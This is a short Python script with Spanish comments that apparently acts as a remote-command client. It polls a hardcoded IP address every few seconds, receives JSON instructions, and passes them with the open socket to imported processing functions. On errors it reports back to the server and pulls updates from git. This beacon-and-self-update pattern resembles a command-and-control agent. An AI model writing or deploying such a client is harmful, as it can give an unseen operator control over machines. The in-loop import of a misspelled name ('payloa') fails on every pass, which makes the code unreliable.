import socket, json, time

from apps.utils.objects import payload
from apps.main import processor
from apps.utils.handleExceptions import handle
from apps.recovery import trying

HOST = '159.112.139.10'
PORT = 7788

while True:
    time.sleep(5)
    try:
        from apps.utils.objects import payloa
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        client.sendall(b'get')

        # Recibir datos del servidor
        data = client.recv(1024).decode()

        try:
            objeto = json.loads(data)

        except json.JSONDecodeError as e:
            print(f"Error al decodificar el JSON: {e}")
            client.close()
            exit()

        x = payload(objeto)
        processor(client, x)

        client.close()
    
    # Controlando el error ConnectionRefusedError
    except ConnectionRefusedError:
        time.sleep(10) # En 10 segundos vuelve a realizar la consulta

    # Lo que hará el sistema cuando encuentre un error diferente    
    except Exception as Error:

        recuperador = trying.recovery(Error)

        # Intentando mandar el error al servidor
        recuperador.sendError()

        # Verificando si el repositorio tiene el parche
        por_actualizar = recuperador.forUpdate()

        if por_actualizar:
            # Actualizando
            recuperador.git_pull()